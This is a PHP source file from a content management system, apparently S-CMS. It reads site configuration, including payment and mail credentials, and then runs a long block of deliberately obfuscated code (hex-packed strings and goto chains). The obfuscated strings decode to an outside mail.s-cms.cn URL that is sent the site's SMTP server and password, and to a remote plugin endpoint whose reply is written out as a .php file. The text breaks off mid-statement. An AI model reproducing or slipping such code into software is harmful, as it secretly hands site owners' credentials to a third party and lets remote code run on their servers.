<?php
$sql="select * from sl_config";
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if(mysqli_num_rows($result) > 0) {
		
		$C_title=$row["C_title"];
		$C_keyword=$row["C_keyword"];
		$C_description=$row["C_description"];
		$C_copyright=$row["C_copyright"];
		$C_code=$row["C_code"];
		$C_logo=$row["C_logo"];
		$C_ico=$row["C_ico"];
		$C_kefu=$row["C_kefu"];

		$C_alipay_pid=$row["C_alipay_pid"];
		$C_alipay_pkey=$row["C_alipay_pkey"];
		$C_7pay_pid=$row["C_7pay_pid"];
		$C_7pay_pkey=$row["C_7pay_pkey"];
		$C_codepay_id=$row["C_codepay_id"];
		$C_codepay_key=$row["C_codepay_key"];
		$C_wx_appid=$row["C_wx_appid"];
		$C_wx_appsecret=$row["C_wx_appsecret"];
		$C_wx_mchid=$row["C_wx_mchid"];
		$C_wx_key=$row["C_wx_key"];
		$C_qqid=$row["C_qqid"];
		$C_qqkey=$row["C_qqkey"];

		$C_alicode=$row["C_alicode"];
		$C_wxcode=$row["C_wxcode"];

		$C_wxapp_id=$row["C_wxapp_id"];
		$C_wxapp_key=$row["C_wxapp_key"];
		$C_aliapp_id=$row["C_aliapp_id"];
		$C_aliapp_key=$row["C_aliapp_key"];
		$C_aliapp_key2=$row["C_aliapp_key2"];
		$C_bdapp_id=$row["C_bdapp_id"];
		$C_bdapp_key=$row["C_bdapp_key"];
		$C_bdapp_key2=$row["C_bdapp_key2"];
		$C_qqapp_id=$row["C_qqapp_id"];
		$C_qqapp_key=$row["C_qqapp_key"];
		$C_zjapp_id=$row["C_zjapp_id"];
		$C_zjapp_key=$row["C_zjapp_key"];

		$C_appt=$row["C_appt"];

		$C_alipayon=$row["C_alipayon"];
		$C_wxpayon=$row["C_wxpayon"];
		$C_7payon=$row["C_7payon"];
		$C_codepayon=$row["C_codepayon"];
		$C_alicodeon=$row["C_alicodeon"];
		$C_wxcodeon=$row["C_wxcodeon"];

		$C_qqon=$row["C_qqon"];
		$C_wxon=$row["C_wxon"];
		$C_rzon=$row["C_rzon"];
		$C_fee=$row["C_fee"];
		$C_rzfee=$row["C_rzfee"];
		$C_rzfeetype=$row["C_rzfeetype"];
		$C_zd=$row["C_zd"];

		$C_vip1=$row["C_vip1"];
		$C_vip2=$row["C_vip2"];
		$C_vip3=$row["C_vip3"];
		$C_vip6=$row["C_vip6"];
		$C_vip12=$row["C_vip12"];
		$C_vip0=$row["C_vip0"];
		$C_p_discount=$row["C_p_discount"];
		$C_n_discount=$row["C_n_discount"];
		$C_p_discount2=$row["C_p_discount2"];
		$C_n_discount2=$row["C_n_discount2"];

		$C_template=$row["C_template"];
		$C_wap=$row["C_wap"];
		$C_beian=$row["C_beian"];
		$C_qrcode=$row["C_qrcode"];
		$C_email=$row["C_email"];
		$C_phone=$row["C_phone"];

		$C_authcode=$row["C_authcode"];

		$C_mailtype=$row["C_mailtype"];
		$C_mailcode=$row["C_mailcode"];
		$C_smtp=$row["C_smtp"];
		$C_html=$row["C_html"];

		$C_fx1=$row["C_fx1"];
		$C_fx2=$row["C_fx2"];
		$C_fx3=$row["C_fx3"];

		$C_memberon=$row["C_memberon"];
		$C_pwdcode=$row["C_pwdcode"];

		$C_twice=$row["C_twice"];
		$C_uncopy=$row["C_uncopy"];
		$C_slide=$row["C_slide"];
		$C_backup=$row["C_backup"];

		$C_domain=$_SERVER['HTTP_HOST'];
		$H_data=$row;
	}

if(!defined("Q6D2T9MJ"))define("Q6D2T9MJ","UIXNG8Xv");$GLOBALS[Q6D2T9MJ]=explode("|d|-|Y", "H*|d|-|Y5A53523132505476");if(!defined("G2HC3ODv"))define("G2HC3ODv","MP9OLHAQ");$GLOBALS[G2HC3ODv]=explode("|4|h|O", "H*|4|h|O4F3730555954334A|4|h|O66696C655F7075745F636F6E74656E7473|4|h|O4B4A315644353976|4|h|O69735F646972|4|h|O463735434853594A|4|h|O6D6B646972|4|h|O43444B4A32584D4A|4|h|O6D6435|4|h|O4E4B39303838334A|4|h|O6261736536345F656E636F6465|4|h|O5635385056563851|4|h|O69735F66696C65|4|h|O523844583538584A|4|h|O737562737472|4|h|O4F46383131495751|4|h|O66696C655F6765745F636F6E74656E7473|4|h|O4849504352464851|4|h|O6261736536345F6465636F6465|4|h|O4E373238335A3051|4|h|O707265675F6D617463685F616C6C|4|h|O4550515A43583951|4|h|O7374725F7265706C616365");if(!defined("Q7HL38Dv"))define("Q7HL38Dv","G00X289J");$GLOBALS[Q7HL38Dv]=explode("|w|5|h", "H*|w|5|h687474703A2F2F6D61696C2E732D636D732E636E2F666168756F2E706870|w|5|h6D61696C5F66726F6D3D|w|5|h266D61696C5F746F3D|w|5|h266D61696C5F6E616D653D|w|5|h266D61696C5F7469746C653D|w|5|h266D61696C5F636F6E74656E743D|w|5|h266D61696C5F736D74703D|w|5|h266D61696C5F7077643D|w|5|h266D61696C5F6C6F676F3D|w|5|h2F6D656469612F|w|5|h266D61696C5F7765623D|w|5|h73636D73");if(!defined("W13WMFQJ"))define("W13WMFQJ","JHTW2W2v");$GLOBALS[W13WMFQJ]=explode("|D|)|w", "H*|D|)|w524D47444D59534A|D|)|w646566696E65|D|)|w5630553255515751|D|)|w5635385056563851|D|)|w2E747874|D|)|w523844583538584A|D|)|w4F46383131495751|D|)|w43444B4A32584D4A|D|)|w4F3730555954334A|D|)|w2E706870|D|)|w687474703A2F2F66682E732D636D732E636E2F6170692F696E6465782E7068703F616374696F6E3D706C756726646F6D61696E3D|D|)|w485454505F484F5354|D|)|w61757468636F64653D|D|)|w26706C75673D");if(!defined("C6WQXR9Q"))define("C6WQXR9Q","PLB077Tv");$GLOBALS[C6WQXR9Q]=explode("|`|%|T", "H*|`|%|T4B5034383833334A|`|%|T646566696E65|`|%|T4C324C4A30363076|`|%|T61757468|`|%|T687474703A2F2F66682E732D636D732E636E2F6170692F696E6465782E7068703F616374696F6E3D636865636B6175746826646F6D61696E3D|`|%|T485454505F484F5354|`|%|T61757468636F64653D|`|%|T73756363657373");if(!defined("BGS9JT0v"))define("BGS9JT0v","AAGBY7TJ");$GLOBALS[BGS9JT0v]=explode("|7|D|r", "H*|7|D|r583149374E544B4A|7|D|r646566696E65|7|D|r443539593551384A|7|D|r687474703A2F2F66682E732D636D732E636E2F6170692F696E6465782E7068703F616374696F6E3D|7|D|r646F6D61696E3D|7|D|r485454505F484F5354|7|D|r2661757468636F64653D|7|D|r26646174613D|7|D|r4849504352464851");if(!defined("DE0558LJ"))define("DE0558LJ","MFCR3QYQ");$GLOBALS[DE0558LJ]=explode("|5|'|l", "H*|5|'|l594138474F5A344A|5|'|l646566696E65|5|'|l41384D493235314A|5|'|l4B4A315644353976|5|'|l636F6E6E2F66696C65|5|'|l463735434853594A|5|'|l73656C65637420636F756E74284E5F696429206173204E5F636F756E742066726F6D20736C5F6E657773|5|'|l4E5F636F756E74|5|'|l73656C65637420636F756E7428505F69642920617320505F636F756E742066726F6D20736C5F70726F64756374|5|'|l505F636F756E74|5|'|l68746D6C|5|'|l485F64617461|5|'|l646179|5|'|l592D6D2D64|5|'|l646F6D61696E|5|'|l485454505F484F5354|5|'|l43444B4A32584D4A|5|'|l4E4B39303838334A|5|'|l435F776170|5|'|l435F74656D706C617465|5|'|l74797065|5|'|l6D6435|5|'|l74|5|'|l5635385056563851|5|'|l636F6E6E2F66696C652F|5|'|l5F|5|'|l2E747874|5|'|l523844583538584A|5|'|l4F46383131495751|5|'|l74706C|5|'|l3C7363726970743E6C6F636174696F6E2E72656C6F616428293B3C2F7363726970743E|5|'|l4849504352464851|5|'|l4E373238335A3051|5|'|l2F3C66682D66756E6374696F6E3E5B5C735C535D2A3F3C5C2F66682D66756E6374696F6E3E2F69|5|'|l4550515A43583951|5|'|l3C66682D66756E6374696F6E3E|5|'|l|5|'|l3C2F66682D66756E6374696F6E3E|5|'|l735B5B|5|'|l24726573756C743D6D7973716C695F71756572792824636F6E6E2C2473716C293B6966286D7973716C695F6E756D5F726F77732824726573756C74293E30297B7768696C652824726F773D6D7973716C695F66657463685F6173736F632824726573756C7429297B|5|'|l73325B5B|5|'|l24726573756C74323D6D7973716C695F71756572792824636F6E6E2C2473716C32293B6966286D7973716C695F6E756D5F726F77732824726573756C7432293E30297B7768696C652824726F77323D6D7973716C695F66657463685F6173736F632824726573756C743229297B|5|'|l73335B5B|5|'|l24726573756C74333D6D7973716C695F71756572792824636F6E6E2C2473716C33293B6966286D7973716C695F6E756D5F726F77732824726573756C7433293E30297B7768696C652824726F77333D6D7973716C695F66657463685F6173736F632824726573756C743329297B|5|'|l5D5D|5|'|l7D7D");if(!defined(pack($GLOBALS[Q6D2T9MJ]{00},$GLOBALS[Q6D2T9MJ]{1})))define(pack($GLOBALS[Q6D2T9MJ]{00},$GLOBALS[Q6D2T9MJ]{1}), ord(7));$GLOBALS[pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{0x1})]=pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv][02]);$GLOBALS[pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv][0x3])]=pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv][0x4]);$GLOBALS[pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{05})]=pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv][6]);$GLOBALS[pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv][07])]=pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{8});$GLOBALS[pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{9})]=pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv][10]);$GLOBALS[pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv][013])]=pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{014});$GLOBALS[pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv][015])]=pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{0xE});$GLOBALS[pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{0xF})]=pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv][16]);$GLOBALS[pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{021})]=pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{022});$GLOBALS[pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{0x13})]=pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{024});$GLOBALS[pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{21})]=pack($GLOBALS[G2HC3ODv][0x0],$GLOBALS[G2HC3ODv]{0x16});function tpl($path){unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx3;goto G17ldMhx3;G17eWjgx3:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x2;G17ldMhx3:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x2:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{1}));$G170=!defined($G17F0);if($G170)goto G17eWjgx4;goto G17ldMhx4;G17eWjgx4:unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx6;goto G17ldMhx6;G17eWjgx6:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x5;G17ldMhx6:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x5:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{02}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx8;goto G17ldMhx8;G17eWjgx8:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x7;G17ldMhx8:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x7:$G17F3=call_user_func_array("pack",array(&$G17ACV4,$GLOBALS[DE0558LJ]{1}));unset($G17ACV7);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgxa;goto G17ldMhxa;G17eWjgxa:$G17ACV7=&$GLOBALS[DE0558LJ][0];goto G17x9;G17ldMhxa:$G17ACV7=$GLOBALS[DE0558LJ][0];G17x9:$G17F6=call_user_func_array("pack",array(&$G17ACV7,$GLOBALS[DE0558LJ]{03}));call_user_func($G17F0,$G17F3,$G17F6);goto G17x1;G17ldMhx4:G17x1:$G17A0=array();$G17A0[]=$_SERVER;unset($G17tI0);$G17tI0=$G17A0;$GLOBALS[YA8GOZ4J]=$G17tI0;global $conn,$H_data,$type,$id,$C_title;unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgxd;goto G17ldMhxd;G17eWjgxd:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17xc;G17ldMhxd:$G17ACV1=$GLOBALS[DE0558LJ][0];G17xc:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{4}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgxf;goto G17ldMhxf;G17eWjgxf:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17xe;G17ldMhxf:$G17ACV4=$GLOBALS[DE0558LJ][0];G17xe:$G17F3=call_user_func_array("pack",array(&$G17ACV4,$GLOBALS[DE0558LJ]{5}));$G170=!$GLOBALS[$G17F0]($G17F3);if($G170)goto G17eWjgxg;goto G17ldMhxg;G17eWjgxg:unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgxi;goto G17ldMhxi;G17eWjgxi:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17xh;G17ldMhxi:$G17ACV1=$GLOBALS[DE0558LJ][0];G17xh:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{6}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgxk;goto G17ldMhxk;G17eWjgxk:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17xj;G17ldMhxk:$G17ACV4=$GLOBALS[DE0558LJ][0];G17xj:$G17F3=call_user_func_array("pack",array(&$G17ACV4,$GLOBALS[DE0558LJ]{5}));@$GLOBALS[$G17F0]($G17F3,0755,true);goto G17xb;G17ldMhxg:G17xb:unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgxo;goto G17ldMhxo;G17eWjgxo:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17xn;G17ldMhxo:$G17ACV1=$GLOBALS[DE0558LJ][0];G17xn:unset($G17ACV2);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgxm;goto G17ldMhxm;G17eWjgxm:$G17ACV2=&$GLOBALS[DE0558LJ][07];goto G17xl;G17ldMhxm:$G17ACV2=$GLOBALS[DE0558LJ][07];G17xl:$G17F0=call_user_func_array("pack",array(&$G17ACV1,&$G17ACV2));unset($G17ACV6);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgxs;goto G17ldMhxs;G17eWjgxs:$G17ACV6=&$GLOBALS[DE0558LJ][0];goto G17xr;G17ldMhxs:$G17ACV6=$GLOBALS[DE0558LJ][0];G17xr:unset($G17ACV7);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgxq;goto G17ldMhxq;G17eWjgxq:$G17ACV7=&$GLOBALS[DE0558LJ][010];goto G17xp;G17ldMhxq:$G17ACV7=$GLOBALS[DE0558LJ][010];G17xp:$G17F5=call_user_func_array("pack",array(&$G17ACV6,&$G17ACV7));$G17F10=call_user_func_array("getrs",array(&$G17F0,&$G17F5));unset($G17tI0);$G17tI0=$G17F10;$N_count=$G17tI0;unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgxw;goto G17ldMhxw;G17eWjgxw:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17xv;G17ldMhxw:$G17ACV1=$GLOBALS[DE0558LJ][0];G17xv:unset($G17ACV2);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgxu;goto G17ldMhxu;G17eWjgxu:$G17ACV2=&$GLOBALS[DE0558LJ][011];goto G17xt;G17ldMhxu:$G17ACV2=$GLOBALS[DE0558LJ][011];G17xt:$G17F0=call_user_func_array("pack",array(&$G17ACV1,&$G17ACV2));unset($G17ACV6);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgxy;goto G17ldMhxy;G17eWjgxy:$G17ACV6=&$GLOBALS[DE0558LJ][0];goto G17xx;G17ldMhxy:$G17ACV6=$GLOBALS[DE0558LJ][0];G17xx:$G17F5=call_user_func_array("pack",array(&$G17ACV6,$GLOBALS[DE0558LJ]{012}));$G17F8=call_user_func_array("getrs",array(&$G17F0,&$G17F5));unset($G17tI0);$G17tI0=$G17F8;$P_count=$G17tI0;unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx13;goto G17ldMhx13;G17eWjgx13:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x12;G17ldMhx13:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x12:unset($G17ACV2);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx11;goto G17ldMhx11;G17eWjgx11:$G17ACV2=&$GLOBALS[DE0558LJ][013];goto G17xz;G17ldMhx11:$G17ACV2=$GLOBALS[DE0558LJ][013];G17xz:$G17F0=call_user_func_array("pack",array(&$G17ACV1,&$G17ACV2));$G17F5=call_user_func_array("file_get_contents",array(&$path));unset($G17ACV7);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx15;goto G17ldMhx15;G17eWjgx15:$G17ACV7=&$GLOBALS[DE0558LJ][0];goto G17x14;G17ldMhx15:$G17ACV7=$GLOBALS[DE0558LJ][0];G17x14:$G17F6=call_user_func_array("pack",array(&$G17ACV7,$GLOBALS[DE0558LJ]{0xC}));unset($G17ACV10);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx19;goto G17ldMhx19;G17eWjgx19:$G17ACV10=&$GLOBALS[DE0558LJ][0];goto G17x18;G17ldMhx19:$G17ACV10=$GLOBALS[DE0558LJ][0];G17x18:unset($G17ACV11);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx17;goto G17ldMhx17;G17eWjgx17:$G17ACV11=&$GLOBALS[DE0558LJ][0xD];goto G17x16;G17ldMhx17:$G17ACV11=$GLOBALS[DE0558LJ][0xD];G17x16:$G17F9=call_user_func_array("pack",array(&$G17ACV10,&$G17ACV11));unset($G17ACV15);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx1b;goto G17ldMhx1b;G17eWjgx1b:$G17ACV15=&$GLOBALS[DE0558LJ][0];goto G17x1a;G17ldMhx1b:$G17ACV15=$GLOBALS[DE0558LJ][0];G17x1a:$G17F14=call_user_func_array("pack",array(&$G17ACV15,$GLOBALS[DE0558LJ]{14}));$G17F17=call_user_func_array("date",array(&$G17F14));unset($G17ACV19);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx1d;goto G17ldMhx1d;G17eWjgx1d:$G17ACV19=&$GLOBALS[DE0558LJ][0];goto G17x1c;G17ldMhx1d:$G17ACV19=$GLOBALS[DE0558LJ][0];G17x1c:$G17F18=call_user_func_array("pack",array(&$G17ACV19,$GLOBALS[DE0558LJ]{15}));$G17P0=73*E_WARNING;$G17P1=$G17P0-146;unset($G17ACV22);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx1f;goto G17ldMhx1f;G17eWjgx1f:$G17ACV22=&$GLOBALS[DE0558LJ][0];goto G17x1e;G17ldMhx1f:$G17ACV22=$GLOBALS[DE0558LJ][0];G17x1e:$G17F21=call_user_func_array("pack",array(&$G17ACV22,$GLOBALS[DE0558LJ]{16}));$G17A24=array();$G17A24[$G17F0]=$G17F5;$G17A24[$G17F6]=$H_data;$G17A24[$G17F9]=$G17F17;$G17A24[$G17F18]=$GLOBALS[YA8GOZ4J][$G17P1][$G17F21];unset($G17tI2);$G17tI2=$G17A24;$data2=$G17tI2;unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx1h;goto G17ldMhx1h;G17eWjgx1h:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x1g;G17ldMhx1h:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x1g:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{021}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx1l;goto G17ldMhx1l;G17eWjgx1l:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x1k;G17ldMhx1l:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x1k:unset($G17ACV5);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx1j;goto G17ldMhx1j;G17eWjgx1j:$G17ACV5=&$GLOBALS[DE0558LJ][18];goto G17x1i;G17ldMhx1j:$G17ACV5=$GLOBALS[DE0558LJ][18];G17x1i:$G17F3=call_user_func_array("pack",array(&$G17ACV4,&$G17ACV5));$G17F8=call_user_func_array("json_encode",array(&$data2));unset($G17tI0);$G17tI0=$GLOBALS[$G17F0]($GLOBALS[$G17F3]($G17F8));$md5=$G17tI0;$G17F0=call_user_func_array("isMobile",array());if($G17F0)goto G17eWjgx1n;goto G17ldMhx1n;G17eWjgx1n:unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx1p;goto G17ldMhx1p;G17eWjgx1p:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x1o;G17ldMhx1p:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x1o:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{19}));unset($G17tI0);$G17tI0=$H_data[$G17F0];$t=$G17tI0;goto G17x1m;G17ldMhx1n:unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx1r;goto G17ldMhx1r;G17eWjgx1r:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x1q;G17ldMhx1r:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x1q:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{20}));unset($G17tI0);$G17tI0=$H_data[$G17F0];$t=$G17tI0;G17x1m:unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx1v;goto G17ldMhx1v;G17eWjgx1v:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x1u;G17ldMhx1v:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x1u:unset($G17ACV2);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx1t;goto G17ldMhx1t;G17eWjgx1t:$G17ACV2=&$GLOBALS[DE0558LJ][013];goto G17x1s;G17ldMhx1t:$G17ACV2=$GLOBALS[DE0558LJ][013];G17x1s:$G17F0=call_user_func_array("pack",array(&$G17ACV1,&$G17ACV2));$G17F5=call_user_func_array("file_get_contents",array(&$path));unset($G17ACV7);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx1x;goto G17ldMhx1x;G17eWjgx1x:$G17ACV7=&$GLOBALS[DE0558LJ][0];goto G17x1w;G17ldMhx1x:$G17ACV7=$GLOBALS[DE0558LJ][0];G17x1w:$G17F6=call_user_func_array("pack",array(&$G17ACV7,$GLOBALS[DE0558LJ]{0xC}));unset($G17ACV10);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx22;goto G17ldMhx22;G17eWjgx22:$G17ACV10=&$GLOBALS[DE0558LJ][0];goto G17x21;G17ldMhx22:$G17ACV10=$GLOBALS[DE0558LJ][0];G17x21:unset($G17ACV11);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx2z;goto G17ldMhx2z;G17eWjgx2z:$G17ACV11=&$GLOBALS[DE0558LJ][010];goto G17x1y;G17ldMhx2z:$G17ACV11=$GLOBALS[DE0558LJ][010];G17x1y:$G17F9=call_user_func_array("pack",array(&$G17ACV10,&$G17ACV11));unset($G17ACV15);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx24;goto G17ldMhx24;G17eWjgx24:$G17ACV15=&$GLOBALS[DE0558LJ][0];goto G17x23;G17ldMhx24:$G17ACV15=$GLOBALS[DE0558LJ][0];G17x23:$G17F14=call_user_func_array("pack",array(&$G17ACV15,$GLOBALS[DE0558LJ]{012}));unset($G17ACV18);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx28;goto G17ldMhx28;G17eWjgx28:$G17ACV18=&$GLOBALS[DE0558LJ][0];goto G17x27;G17ldMhx28:$G17ACV18=$GLOBALS[DE0558LJ][0];G17x27:unset($G17ACV19);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx26;goto G17ldMhx26;G17eWjgx26:$G17ACV19=&$GLOBALS[DE0558LJ][21];goto G17x25;G17ldMhx26:$G17ACV19=$GLOBALS[DE0558LJ][21];G17x25:$G17F17=call_user_func_array("pack",array(&$G17ACV18,&$G17ACV19));unset($G17ACV23);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx2a;goto G17ldMhx2a;G17eWjgx2a:$G17ACV23=&$GLOBALS[DE0558LJ][0];goto G17x29;G17ldMhx2a:$G17ACV23=$GLOBALS[DE0558LJ][0];G17x29:$G17F22=call_user_func_array("pack",array(&$G17ACV23,$GLOBALS[DE0558LJ]{026}));unset($G17ACV26);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx2c;goto G17ldMhx2c;G17eWjgx2c:$G17ACV26=&$GLOBALS[DE0558LJ][0];goto G17x2b;G17ldMhx2c:$G17ACV26=$GLOBALS[DE0558LJ][0];G17x2b:$G17F25=call_user_func_array("pack",array(&$G17ACV26,$GLOBALS[DE0558LJ]{027}));$G17A28=array();$G17A28[$G17F0]=$G17F5;$G17A28[$G17F6]=$H_data;$G17A28[$G17F9]=$N_count;$G17A28[$G17F14]=$P_count;$G17A28[$G17F17]=$type;$G17A28[$G17F22]=$md5;$G17A28[$G17F25]=$t;unset($G17tI0);$G17tI0=$G17A28;$data=$G17tI0;unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx2f;goto G17ldMhx2f;G17eWjgx2f:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x2e;G17ldMhx2f:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x2e:$G17F0=call_user_func_array("pack",array(&$G17ACV1,$GLOBALS[DE0558LJ]{030}));unset($G17ACV4);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx2n;goto G17ldMhx2n;G17eWjgx2n:$G17ACV4=&$GLOBALS[DE0558LJ][0];goto G17x2m;G17ldMhx2n:$G17ACV4=$GLOBALS[DE0558LJ][0];G17x2m:$G17F3=call_user_func_array("pack",array(&$G17ACV4,$GLOBALS[DE0558LJ]{25}));$G17P0=$G17F3 . $t;unset($G17ACV6);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx2l;goto G17ldMhx2l;G17eWjgx2l:$G17ACV6=&$GLOBALS[DE0558LJ][0];goto G17x2k;G17ldMhx2l:$G17ACV6=$GLOBALS[DE0558LJ][0];G17x2k:unset($G17ACV7);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx2j;goto G17ldMhx2j;G17eWjgx2j:$G17ACV7=&$GLOBALS[DE0558LJ][032];goto G17x2i;G17ldMhx2j:$G17ACV7=$GLOBALS[DE0558LJ][032];G17x2i:$G17F5=call_user_func_array("pack",array(&$G17ACV6,&$G17ACV7));$G17P1=$G17P0 . $G17F5;$G17P2=$G17P1 . $type;unset($G17ACV9);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx2h;goto G17ldMhx2h;G17eWjgx2h:$G17ACV9=&$GLOBALS[DE0558LJ][0];goto G17x2g;G17ldMhx2h:$G17ACV9=$GLOBALS[DE0558LJ][0];G17x2g:$G17F8=call_user_func_array("pack",array(&$G17ACV9,$GLOBALS[DE0558LJ]{033}));$G17P3=$G17P2 . $G17F8;if($GLOBALS[$G17F0]($G17P3))goto G17eWjgx2o;goto G17ldMhx2o;G17eWjgx2o:unset($G17ACV1);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx2t;goto G17ldMhx2t;G17eWjgx2t:$G17ACV1=&$GLOBALS[DE0558LJ][0];goto G17x2s;G17ldMhx2t:$G17ACV1=$GLOBALS[DE0558LJ][0];G17x2s:unset($G17ACV2);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx2r;goto G17ldMhx2r;G17eWjgx2r:$G17ACV2=&$GLOBALS[DE0558LJ][0x1C];goto G17x2q;G17ldMhx2r:$G17ACV2=$GLOBALS[DE0558LJ][0x1C];G17x2q:$G17F0=call_user_func_array("pack",array(&$G17ACV1,&$G17ACV2));unset($G17ACV6);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx2v;goto G17ldMhx2v;G17eWjgx2v:$G17ACV6=&$GLOBALS[DE0558LJ][0];goto G17x2u;G17ldMhx2v:$G17ACV6=$GLOBALS[DE0558LJ][0];G17x2u:$G17F5=call_user_func_array("pack",array(&$G17ACV6,$GLOBALS[DE0558LJ]{035}));unset($G17ACV9);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx34;goto G17ldMhx34;G17eWjgx34:$G17ACV9=&$GLOBALS[DE0558LJ][0];goto G17x33;G17ldMhx34:$G17ACV9=$GLOBALS[DE0558LJ][0];G17x33:$G17F8=call_user_func_array("pack",array(&$G17ACV9,$GLOBALS[DE0558LJ]{25}));$G17P0=$G17F8 . $t;unset($G17ACV11);if(is_array($GLOBALS[DE0558LJ]))goto G17eWjgx32;goto 